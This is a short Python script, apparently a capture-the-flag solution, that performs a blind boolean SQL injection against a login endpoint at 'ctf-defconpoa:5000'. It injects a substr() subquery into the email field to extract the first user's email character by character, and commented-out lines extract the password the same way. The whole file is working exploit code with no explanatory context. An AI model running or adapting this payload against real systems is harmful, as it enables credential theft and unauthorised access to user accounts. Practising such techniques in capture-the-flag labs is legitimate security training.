import requests
import string

def main():
    URL = "http://ctf-defconpoa:5000/login"

    email = ""
    #password = ""
    sign = True
    cont = 1
    while sign:
        sign = False
        for char in string.printable:
            raw = {"email": "' OR ((SELECT substr(email,{},1) FROM users LIMIT 1)=='{}') -- -".format(str(cont), char), "password": "12345"}
            #raw = {"email": "' OR ((SELECT substr(password,{},1) FROM users LIMIT 1)=='{}') -- -".format(str(cont), char), "password": "12345"} # extract password
            req = requests.post(URL, data=raw)
            if req.status_code == 200:
                email += char
                #password += char
                sign = True
                break
        cont += 1
        print(email)
        #print(password)
    print("Email:", email)
    #print("Password:", password)

if __name__ == "__main__":
    main()
